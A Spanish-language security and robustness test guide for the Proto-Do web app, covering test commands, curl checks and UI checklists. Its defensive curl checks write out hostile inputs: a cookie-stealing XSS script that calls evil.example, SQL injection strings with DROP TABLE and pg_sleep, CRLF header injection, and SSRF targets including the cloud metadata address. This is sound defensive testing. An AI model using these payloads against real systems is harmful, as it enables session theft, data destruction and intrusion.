# Guía de pruebas «a mala leche» — Proto-Do

Esta guía recoge pruebas hechas con la intención de **romper** el sistema: entradas hostiles,
carreras entre usuarios, tokens ya revocados. No basta con comprobar que el camino feliz
funciona. Cada escenario indica el objetivo, el ataque listo para copiar, el resultado esperado y
la prueba automatizada que lo cubre. Si una prueba da otro resultado, hay un defecto. No se
ajusta la guía para que cuadre.

Está organizada en tres secciones operativas: pruebas automatizadas (terminal / CLI), pruebas de
red y seguridad (cURL / HTTP) y pruebas manuales de interfaz de usuario. El [Índice](#índice) enlaza
cada escenario.

**Stack real que se prueba.** Backend NestJS 11 sobre Express (`@nestjs/platform-express`), con
TypeORM sobre PostgreSQL (driver `pg`), `class-validator` + `ValidationPipe` global con
`forbidNonWhitelisted`, y `@nestjs/throttler`. Frontend Vue 3 + Quasar, con tests en Vitest +
`@vue/test-utils` sobre `happy-dom`. No hay Cypress: `playwright` es una dependencia de
**ejecución** del backend (scraping headless del nodo `EXTRACTOR_WEB`), no un framework de tests.

> **Dónde ejecutar.** Siempre contra `<nombre_bd_test>` y con un backend arrancado sin efectos
> reales (sin sondeo IMAP, sin cron y sin reanudación por correo):
>
> ```bash
> cd backend
> IMAP_POLLING_ENABLED=false CRON_SCHEDULING_ENABLED=false INBOUND_RESUME_ENABLED=false \
>   DB_NAME='<nombre_bd_test>' PORT=3100 npm run start
> ```
>
> Para los `curl`, toma el access token de una sesión real: DevTools → Network → cualquier
> petición `/api` → cabecera `Authorization`. Después:
>
> ```bash
> export API=http://localhost:3100/api
> export TOKEN='<access token>'
> ```

## Índice

- [1. Pruebas automatizadas (terminal / CLI)](#1-pruebas-automatizadas-terminal--cli)
  - [1.1 Baterías completas](#11-baterías-completas)
  - [1.2 Suites de borde, una a una](#12-suites-de-borde-una-a-una)
  - [1.3 Datos de prueba: resguardo y purga](#13-datos-de-prueba-resguardo-y-purga)
- [2. Pruebas de red y seguridad (cURL / HTTP)](#2-pruebas-de-red-y-seguridad-curl--http)
  - [2.1 Desbordamiento de payload (10 MB frente a 100 KB)](#21-desbordamiento-de-payload-10-mb-frente-a-100-kb)
  - [2.2 SSRF: destinos en redes privadas](#22-ssrf-destinos-en-redes-privadas)
  - [2.3 Cabeceras prohibidas y nombres hostiles en el destino HTTP](#23-cabeceras-prohibidas-y-nombres-hostiles-en-el-destino-http)
  - [2.4 Errores 400 del login (OTP)](#24-errores-400-del-login-otp)
  - [2.5 Inyección SQL por el orden (sortBy / sortOrder)](#25-inyección-sql-por-el-orden-sortby--sortorder)
  - [2.6 Límites de tasa (rate limiting)](#26-límites-de-tasa-rate-limiting)
  - [2.7 Revocación inmediata del JWT (tokenVersion)](#27-revocación-inmediata-del-jwt-tokenversion)
  - [2.8 Tarifas de IA: el relevo nunca queda a medias](#28-tarifas-de-ia-el-relevo-nunca-queda-a-medias)
  - [2.9 Desbordamiento de búsquedas y parámetros](#29-desbordamiento-de-búsquedas-y-parámetros)
  - [2.10 XSS en prompts y plantillas](#210-xss-en-prompts-y-plantillas)
- [3. Pruebas manuales de interfaz de usuario](#3-pruebas-manuales-de-interfaz-de-usuario)
  - [3.1 Menú de accesibilidad en móvil](#31-menú-de-accesibilidad-en-móvil)
  - [3.2 Banco de pruebas de nodos (/nodos/config-sandbox)](#32-banco-de-pruebas-de-nodos-nodosconfig-sandbox)
  - [3.3 Tiempo real por WebSocket (sin F5)](#33-tiempo-real-por-websocket-sin-f5)
  - [3.4 Presets del destino HTTP genérico](#34-presets-del-destino-http-genérico)
  - [3.5 Filtro de asunto del disparador IMAP](#35-filtro-de-asunto-del-disparador-imap)
  - [3.6 El aviso de 5 segundos y las entradas numéricas (/precios)](#36-el-aviso-de-5-segundos-y-las-entradas-numéricas-precios)

---

## 1. Pruebas automatizadas (terminal / CLI)

### 1.1 Baterías completas

| Capa | Comando | Qué cubre |
|---|---|---|
| Backend: build + tipos + unitarias | `cd backend && npm run verify` | `nest build`, `tsc -p tsconfig.build.json` y `jest` entero |
| Backend: solo unitarias | `cd backend && npx jest` | Estrategias, DTOs, servicios, guardas |
| Backend: E2E (PostgreSQL real) | `cd backend && npm run test:migrate && npm run test:e2e` (base de `E2E_DB_NAME` en `backend/.env`) | Frontera HTTP con el `ValidationPipe` de producción (`supertest` contra el `AppModule`) |
| Frontend: componentes y stores | `cd frontend && npm run test` | Vitest (`vitest run`) sobre `src/**/*.spec.ts` |
| Frontend: tipos | `cd frontend && npx vue-tsc --noEmit` | Plantillas y TypeScript estricto |

> `npm run verify` es el comando que vale para saber si el backend compila: `npx tsc --noEmit`
> sobre el `tsconfig.json` completo arrastra errores de tipos **previos** en los `*.spec.ts`
> (mocks de TypeORM) que no son regresiones, y no ejecuta el compilador de Nest.

### 1.2 Suites de borde, una a una

Jest y Vitest aceptan un patrón de ruta como argumento posicional; no hace falta `--` porque son
los propios binarios.

```bash
# --- Backend (cd backend) ---
# Filtro de asunto IMAP por palabra completa: "de" NO casa dentro de "DESTINO"
npx jest src/modules/nodes/strategies/imap-filter.util.spec.ts
npx jest src/modules/nodes/strategies/imap-trigger.strategy.spec.ts -t "Palabras clave"

# Destino HTTP generico: reintentos por verbo, corchetes JSON:API, cabeceras prohibidas
npx jest src/modules/nodes/dto/http-generic-destination-config.dto.spec.ts
npx jest src/modules/nodes/strategies/http-generic-destination.strategy.spec.ts

# Guarda SSRF (rangos privados, DNS rebinding) y limites del body parser (413)
npx jest src/core/http
npx jest src/common/http/configure-body-parsers.spec.ts

# Inyeccion por el orden, revocacion JWT, relevo de tarifas
npx jest src/common/utils/sort-whitelist.util.spec.ts
npx jest src/modules/auth/strategies/jwt.strategy.spec.ts
npx jest src/modules/pricing

# Auditoria del descarte (FLUJO_DESCARTADO) y evento global execution:updated
npx jest src/modules/workflows/workflows.service.spec.ts -t "FLUJO_DESCARTADO"
npx jest src/common/services/execution-events.coordinator.spec.ts

# --- Frontend (cd frontend) ---
npx vitest run src/components/shared/WarningModal.spec.ts          # aviso de 5 s, reloj falso
npx vitest run src/components/shared/KeyValueRowsEditor.spec.ts    # presets y ayuda HTTP
npx vitest run src/stores/executions.store.spec.ts                 # historial en tiempo real
npx vitest run src/components/shared/AccessibilityMenu.spec.ts     # menu de accesibilidad
npx vitest run src/utils/numeric-input.spec.ts                     # teclas no numericas
```

Para iterar sobre un solo caso: `npx jest <ruta> -t "<texto del it>"` o
`npx vitest run <ruta> -t "<texto del it>"`.

### 1.3 Datos de prueba: resguardo y purga

`scripts/purge-test-data.sql` borra los flujos de prueba (con sus ejecuciones, logs, alertas y
telemetría en cascada) y conserva solo los flujos de referencia. **Antes de ejecutarlo:**

1. Detén el backend. Hay flujos `[E2E] Pipeline dummy` en `ACTIVO` con cron programado.
2. Haz el respaldo con `pg_dump`. El comando está en la cabecera del script.
3. Ejecuta primero la variante en seco (con `ROLLBACK`) y revisa los recuentos.

---

## 2. Pruebas de red y seguridad (cURL / HTTP)

Todas las rutas cuelgan del prefijo global `/api`. Cada bloque indica el código esperado al final
de la línea.

### 2.1 Desbordamiento de payload (10 MB frente a 100 KB)

**Defensa.** La app se crea con `bodyParser: false` y `configure-body-parsers.ts` monta dos
parsers JSON:

- `POST /api/nodes/sandbox/run` (banco de pruebas): límite **10 MB** (`SANDBOX_JSON_LIMIT`),
  porque recibe contextos simulados con correos y adjuntos.
- Todo lo demás: el límite por defecto de Express, **100 KB**.

```bash
# Cuerpo de ~200 KB
python3 -c "import json; print(json.dumps({'nodeType':'MAPEADOR_PLANTILLA','params':{},'upstreamContext':{'parsed_email':{'body':'x'*200000}}}))" > /tmp/body-200k.json
# Cuerpo de ~11 MB
python3 -c "import json; print(json.dumps({'nodeType':'MAPEADOR_PLANTILLA','params':{},'upstreamContext':{'parsed_email':{'body':'x'*11000000}}}))" > /tmp/body-11m.json

# 200 KB contra una ruta normal: el parser lo corta antes del controlador
curl -s -o /dev/null -w '%{http_code}\n' -X POST "$API/pricing" \
  -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
  --data-binary @/tmp/body-200k.json                                   # 413

# 200 KB contra el banco de pruebas: pasa el parser (llega al DTO / al nodo)
curl -s -o /dev/null -w '%{http_code}\n' -X POST "$API/nodes/sandbox/run" \
  -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
  --data-binary @/tmp/body-200k.json                                   # 200 o 400, nunca 413

# 11 MB contra el banco de pruebas: supera su techo
curl -s -o /dev/null -w '%{http_code}\n' -X POST "$API/nodes/sandbox/run" \
  -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
  --data-binary @/tmp/body-11m.json                                    # 413
```

**Esperado.** Nunca 500, y el proceso de Nest sigue respondiendo después. El banco de pruebas
admite 10 peticiones por minuto (§2.6): si encadenas muchas, verás 429.

**Pruebas.** `configure-body-parsers.spec.ts` (1.3: 413 fuera del banco de pruebas).

### 2.2 SSRF: destinos en redes privadas

**Defensa.** `outbound-url.guard.ts` bloquea `0/8`, `10/8`, `100.64/10`, `127/8`, `169.254/16`,
`172.16/12`, `192.0.0/24`, `192.168/16`, `198.18/15`, `224/4`, `240/4` y sus equivalentes IPv6
(`::1`, `fc00::/7`, `fe80::/10`…). Comprueba la IP literal **y** cada IP a la que resuelve el host,
y se pasa a axios como `lookup` para cortar el *DNS rebinding*. Además el destino HTTP va con
`maxRedirects: 0`, así que un 302 hacia `127.0.0.1` tampoco cuela.

```bash
for target in http://127.0.0.1:5432/ http://169.254.169.254/latest/meta-data/ \
              http://10.0.0.1/ http://[::1]/ http://localhost:3100/api/users; do
  curl -s -X POST "$API/nodes/sandbox/run" \
    -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
    -d "{\"nodeType\":\"DESTINO_HTTP_GENERICO\",\"params\":{\"targetUrl\":\"$target\",\"method\":\"GET\"},\"upstreamContext\":{}}" \
    | grep -o 'ERR_HTTP_GENERIC_TARGET_BLOCKED' || echo "FALLO: $target no bloqueado"
done
# Esperado: cinco veces ERR_HTTP_GENERIC_TARGET_BLOCKED (respuesta 200 con success:false)
```

Al **guardar** un flujo con esa URL literal, el validador responde 400 con
`ERR_HTTP_GENERIC_TARGET_BLOCKED` en `nodes.<clave>.params.targetUrl`. Una URL que empieza por un
marcador (`{{scraped_web.url}}`) no se puede juzgar al guardar: la frena la estrategia en
ejecución, ya interpolada.

**Pruebas.** `src/core/http/*.spec.ts`; `http-generic-destination.strategy.spec.ts`.

### 2.3 Cabeceras prohibidas y nombres hostiles en el destino HTTP

La autenticación entra **solo** por credencial de la bóveda: `Authorization`, `Cookie`, `Host`,
`Content-Length`, `Transfer-Encoding`, `Connection` y `Proxy-Authorization` no se pueden fijar a
mano.

```bash
run() { curl -s -o /dev/null -w '%{http_code}\n' -X POST "$API/nodes/sandbox/run" \
  -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' -d "$1"; }

run '{"nodeType":"DESTINO_HTTP_GENERICO","params":{"targetUrl":"https://api.ejemplo.org","headers":{"Authorization":"Bearer x"}},"upstreamContext":{}}'      # 400
run '{"nodeType":"DESTINO_HTTP_GENERICO","params":{"targetUrl":"https://api.ejemplo.org","headers":{"X-Ok":"a\r\nX-Inyectada: 1"}},"upstreamContext":{}}'  # 400
run '{"nodeType":"DESTINO_HTTP_GENERICO","params":{"targetUrl":"https://api.ejemplo.org","headers":{"page[number]":"1"}},"upstreamContext":{}}'           # 400 (corchetes solo en query)
run '{"nodeType":"DESTINO_HTTP_GENERICO","params":{"targetUrl":"https://api.ejemplo.org","retryAttempts":9},"upstreamContext":{}}'                         # 400 (maximo 5)
```

**Pruebas.** `http-generic-destination-config.dto.spec.ts` §2 y §3.

### 2.4 Errores 400 del login (OTP)

El login no tiene contraseña: `POST /api/auth/otp/generate` con `{ email }` y
`POST /api/auth/otp/validate` con `{ email, code (6 dígitos), deviceId (UUID) }`.

```bash
otp() { curl -s -o /dev/null -w '%{http_code}\n' -X POST "$API/auth/otp/validate" \
  -H 'Content-Type: application/json' -d "$1"; }

otp '{}'                                                                       # 400
otp '{"email":"no-es-un-correo","code":"123456","deviceId":"3f1c2b64-8a5e-4c2f-9d3a-7b6e5f4c1a20"}'  # 400
otp '{"email":"qa@unuware.com","code":"12345","deviceId":"3f1c2b64-8a5e-4c2f-9d3a-7b6e5f4c1a20"}'    # 400 (5 digitos)
otp '{"email":"qa@unuware.com","code":"12a456","deviceId":"3f1c2b64-8a5e-4c2f-9d3a-7b6e5f4c1a20"}'   # 400
otp '{"email":"qa@unuware.com","code":"123456","deviceId":"no-uuid"}'          # 400
otp '{"email":"qa@unuware.com","code":"123456","deviceId":"3f1c2b64-8a5e-4c2f-9d3a-7b6e5f4c1a20","rol":"ADMIN"}'  # 400 (campo de mas)
curl -s -o /dev/null -w '%{http_code}\n' -X POST "$API/auth/otp/validate" \
  -H 'Content-Type: application/json' -d '{"email":'                           # 400 (JSON roto, no 500)
```

**Esperado.** 400 con el mensaje del DTO; nunca 500. `otp/generate` responde **202 con el mismo
mensaje** exista o no la cuenta, para no permitir enumerar correos. Cuidado: cada `validate` cuenta
para el límite de 3 por minuto (§2.6).

### 2.5 Inyección SQL por el orden (`sortBy` / `sortOrder`)

**Objetivo.** TypeORM concatena en crudo el primer argumento de `.orderBy()`: no hay parámetro
enlazado posible para un identificador. Si el texto del cliente llegara hasta ahí, sería una
inyección servida.

**Defensa.**

1. `@SortByField(claves)` en el DTO rechaza con 400 todo lo que no sea una clave exacta de la lista
   blanca: arrays, objetos, mayúsculas distintas, espacios.
2. `resolveSort` traduce la clave a una ruta escrita en el código fuente. Usa `Object.hasOwn`, así
   que `constructor` y `__proto__` no se cuelan desde el prototipo.

```bash
h=(-s -o /dev/null -w '%{http_code}\n' -H "Authorization: Bearer $TOKEN")
curl "${h[@]}" "$API/pricing?sortBy=validFrom;DROP%20TABLE%20usuarios--"   # 400
curl "${h[@]}" "$API/audit/events?sortBy=(SELECT%20pg_sleep(5))"            # 400, y al instante
curl "${h[@]}" "$API/executions?sortBy=1"                                   # 400 (orden posicional)
curl "${h[@]}" "$API/telemetry/history?sortBy=constructor"                  # 400
curl "${h[@]}" "$API/pricing?sortBy=vigente_desde"                          # 400 (la columna SQL real tampoco)
curl "${h[@]}" "$API/pricing?sortBy=aiModel&sortOrder=asc,id"               # 400
curl "${h[@]}" "$API/pricing?sortBy[]=aiModel"                              # 400
```

**Esperado.** Ninguna tarda (`pg_sleep` no llega a ejecutarse) y las claves válidas, en `ASC` y en
`desc`, devuelven 200.

**Pruebas.** `sort-whitelist.util.spec.ts`; `input-resilience.e2e-spec.ts` §2.

### 2.6 Límites de tasa (rate limiting)

`@nestjs/throttler` con un único throttler `otp` (`ThrottlerGuard` aplicado por controlador, no
global):

| Ruta | Límite |
|---|---|
| `POST /api/auth/otp/generate` y `POST /api/auth/otp/validate` | 3 / minuto (`OTP_THROTTLE_LIMIT`, `OTP_THROTTLE_TTL_MS`) |
| `POST /api/auth/refresh` y `POST /api/auth/logout` | 10 / minuto |
| `POST /api/prompts/optimize` | 10 / minuto |
| `POST /api/nodes/sandbox/run` | 10 / minuto |

```bash
for i in $(seq 1 5); do
  curl -s -o /dev/null -w '%{http_code}\n' -X POST "$API/auth/otp/generate" \
    -H 'Content-Type: application/json' -d '{"email":"qa@unuware.com"}'
done
# Esperado: las tres primeras 202; a partir de la cuarta, 429.
```

> No está automatizado **a propósito**: cada `otp/generate` válido envía un correo real. Si se
> automatiza, que sea con el transporte SMTP doblado.

**Observación.** `/pricing` no tiene throttle propio. Es solo para ADMIN y cada alta exige 5 s de
confirmación en la interfaz, pero la API se puede llamar directamente.

### 2.7 Revocación inmediata del JWT (`tokenVersion`)

`JwtStrategy.validate` consulta `usuarios.token_version` en cada petición y compara con igualdad
estricta; `UsersService` sube el contador al cambiar rol, estado o correo; un `sub` que no sea UUID
se rechaza antes de tocar la base de datos.

1. **En caliente.** Inicia sesión como EDITOR y copia el token. Desde otra sesión ADMIN, cámbiale
   el rol o desactívalo. Repite cualquier `curl` con el token viejo → **401**.
2. **A mano.** `UPDATE usuarios SET token_version = token_version + 1 WHERE correo = '...';` y
   repite → **401**.
3. **Token reemitido.** Vuelve a iniciar sesión y repite → **200** (revocar no es bloquear).
4. **`sub` hostil firmado** (simula un `JWT_SECRET` filtrado): `sub = "x' OR '1'='1"` → **401**.
   Antes devolvía 500 y delataba el motor de base de datos; corregido con `isUUID`.
5. **Firma alterada.** Cambia los cuatro últimos caracteres del token → **401**.

**Pruebas.** `jwt.strategy.spec.ts` §2; `input-resilience.e2e-spec.ts` §4.

### 2.8 Tarifas de IA: el relevo nunca queda a medias

Para cada par (proveedor, modelo) hay **exactamente una** tarifa vigente. La transacción hace
`SELECT … FOR UPDATE`, desactiva e inserta, y el índice único parcial
`uq_precios_modelos_ia_activa` (migración 052) cierra la carrera sin vigente previa.

```bash
for r in 1 2 3; do
  curl -s -o /dev/null -w '%{http_code}\n' -X POST "$API/pricing" \
    -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
    -d "{\"aiProvider\":\"OPENAI\",\"aiModel\":\"carrera-1\",\"promptRateUsdPerMTok\":$r,\"completionRateUsdPerMTok\":1,\"reasoningRateUsdPerMTok\":1}" &
done; wait
# Cada una 201 o 409, nunca 500. Despues:
#   SELECT count(*) FROM precios_modelos_ia WHERE modelo_ia='carrera-1' AND activo;  -> 1

curl -s -o /dev/null -w '%{http_code}\n' -X PATCH  "$API/pricing/<id>" -H "Authorization: Bearer $TOKEN"  # 404
curl -s -o /dev/null -w '%{http_code}\n' -X DELETE "$API/pricing/<id>" -H "Authorization: Bearer $TOKEN"  # 404
```

**Pruebas.** `pricing.service.spec.ts` §1 y §4; `input-resilience.e2e-spec.ts` §1.

### 2.9 Desbordamiento de búsquedas y parámetros

`@TrimmedString` + `@MaxLength(100)` en el buscador, `escapeLike` para `%`, `_` y `\`, `limit` de
1 a 100 y `forbidNonWhitelisted` para cualquier parámetro no declarado.

```bash
h=(-s -o /dev/null -w '%{http_code}\n' -H "Authorization: Bearer $TOKEN")
curl "${h[@]}" "$API/pricing?search=$(printf 'x%.0s' {1..101})"   # 400
curl "${h[@]}" "$API/pricing?search=%25"                          # 200 con total 0 (el % es literal)
curl "${h[@]}" "$API/pricing?limit=100000"                        # 400
curl "${h[@]}" "$API/pricing?limit=abc"                           # 400
curl "${h[@]}" "$API/pricing?debug=true"                          # 400
curl "${h[@]}" "$API/pricing?activeOnly=si"                       # 400 (solo true/false)
curl "${h[@]}" "$API/pricing?from=2026-10-22&to=2026-10-01"       # 400 (rango invertido)
```

**Pruebas.** `input-resilience.e2e-spec.ts` §3; `pricing.service.spec.ts` 2.3.

### 2.10 XSS en prompts y plantillas

La vista previa de plantillas va en un `<iframe sandbox="">` sin `allow-*`, no hay ningún `v-html`
en `frontend/src` y el backend sanea con `sanitize-html` y `escape-html.util.ts`.

- Prompt: pega `<img src=x onerror=alert(document.cookie)>` → se ve literal, sin `alert`.
- Plantilla HTML: `<script>fetch('https://evil.example/'+document.cookie)</script>` y abre la
  vista previa → no se ejecuta y en Network no sale ninguna petición a `evil.example`.
- Modelo de una tarifa: `gpt'; DROP TABLE usuarios;--` → 400 del DTO.

**Pruebas.** `pricing.controller.spec.ts` 1.5; `PricingDialog.spec.ts` 1.3.

---

## 3. Pruebas manuales de interfaz de usuario

Marca cada casilla solo si el resultado coincide **exactamente** con el esperado.

### 3.1 Menú de accesibilidad en móvil

Con DevTools → modo dispositivo, a **360 × 740** y después a **320 × 568**:

- [ ] La cabecera no hace scroll horizontal: se ven el menú lateral, el logotipo, el botón de
      accesibilidad y el avatar. El breadcrumb y su separador desaparecen por debajo de 600 px.
- [ ] El conmutador de modo oscuro **no** está en la cabecera: aparece dentro del menú de
      accesibilidad como «Modo oscuro».
- [ ] Activa «Objetivos táctiles amplios (44 px)». Los botones de la cabecera miden ≥ 44 × 44
      (inspector → *Computed*) y siguen sin solaparse ni desbordar.
- [ ] Con 44 px **y** el texto al 150 %, el menú de accesibilidad cabe en la pantalla, hace scroll
      interno y se cierra con `Esc`. Los botones de tamaño de texto pasan a varias líneas.
- [ ] Cambia cada paleta (deuteranopia, protanopia, tritanopia, alto contraste) en claro y en
      oscuro: los badges de estado siguen mostrando texto + icono, no solo color.

### 3.2 Banco de pruebas de nodos (`/nodos/config-sandbox`)

- [ ] Como EDITOR, ejecuta un `MAPEADOR_PLANTILLA` con contexto simulado: el resultado sale sin
      tocar ningún flujo real.
- [ ] Un `DESTINO_HTTP_GENERICO` contra `http://127.0.0.1/` devuelve el error de destino bloqueado
      sin enviar nada (§2.2).
- [ ] Lanza 11 ejecuciones en menos de un minuto: la undécima falla con 429 (DevTools → Network)
      y la interfaz muestra un error, no se queda cargando.
- [ ] `PROCESADOR_IA` y `PROCESADOR_OCR` piden confirmación antes de ejecutar, porque facturan
      tokens reales; el destino HTTP se lanza directamente.

### 3.3 Tiempo real por WebSocket (sin F5)

Abre el panel principal (historial de ejecuciones) en una ventana y el flujo en otra:

- [ ] Ejecuta un flujo: la fila nueva aparece arriba del historial en ≤ 1 s, en «En proceso».
- [ ] Provoca una pausa (nodo de pausa o fallo GRAVE): la fila pasa a «Pausado» sin recargar.
- [ ] Reanuda desde el canvas: la fila pasa a «En proceso» y después al estado final.
- [ ] Descarta una ejecución pausada escribiendo un motivo: la fila pasa a «Descartado» y en
      Auditoría aparece «Flujo descartado» con `estado_previo`, `flujo_id`, `ejecucion_id` y
      `motivo_descarte`.
- [ ] Desactiva un flujo con una ejecución viva: la fila pasa a «Fallido» sin recargar.
- [ ] Corta la red 10 s (DevTools → *Offline*) y restáurala: el socket se reconecta y los
      siguientes cambios vuelven a llegar.

### 3.4 Presets del destino HTTP genérico

En el asistente, nodo «Destino HTTP genérico»:

- [ ] El nombre de cabecera ofrece `Content-Type`, `Accept`, `User-Agent` y `X-Api-Key`, y admite
      escribir una propia (`X-Origen`).
- [ ] El valor ofrece `application/json` y `application/vnd.api+json`.
- [ ] El icono de ayuda junto a `Content-Type: application/vnd.api+json` explica el estándar
      JSON:API (Drupal); junto a `Accept`, qué respuesta se espera.
- [ ] Escribir `Authorization` muestra el error «no se puede fijar a mano» y su ayuda remite a la
      bóveda de credenciales.
- [ ] Los parámetros de consulta ofrecen `page[number]`, `page[size]`, `filter[search]`, `sort` e
      `include`, y el flujo se guarda sin error con corchetes.
- [ ] Con método GET los reintentos pasan a 3; con POST vuelven a 0 y aparece el aviso de
      duplicados si se suben a mano.

### 3.5 Filtro de asunto del disparador IMAP

- [ ] Modo «Al menos una palabra» con `de`: un correo «PRUEBA DESTINO HTTP» queda **omitido**.
- [ ] Modo «Todas las palabras» con `verificacion, titulos`: «Solicitud de VERIFICACIÓN de
      títulos» dispara el flujo; «Solicitud de verificación» no.
- [ ] Un flujo antiguo con patrón `(?:a|b)` se abre en «Al menos una palabra» con esos términos.

### 3.6 El aviso de 5 segundos y las entradas numéricas (`/precios`)

1. Pulsa «Registrar tarifa» repetidas veces durante la cuenta atrás → el botón está deshabilitado.
2. Abre el aviso, espera 4 s, cancela y vuelve a abrirlo → la cuenta **reinicia** en 5.
3. Pulsa `Esc` o haz clic fuera → el aviso no se cierra; solo «Cancelar» lo cierra.
4. Teclea `e`, `E`, `+`, `-` o `,` en una tarifa → no entra. El punto sí (separador decimal).
5. Pega `-1`, `0.1234567` o `10000000` → error de validación; no se llega al aviso.
6. Intenta elegir mañana en el filtro de vigencia → deshabilitado; tecleado, «No se pueden
   consultar fechas futuras».

**Pruebas.** `WarningModal.spec.ts`; `PricingDialog.spec.ts`; `PricingManager.spec.ts`;
`numeric-input.spec.ts`.
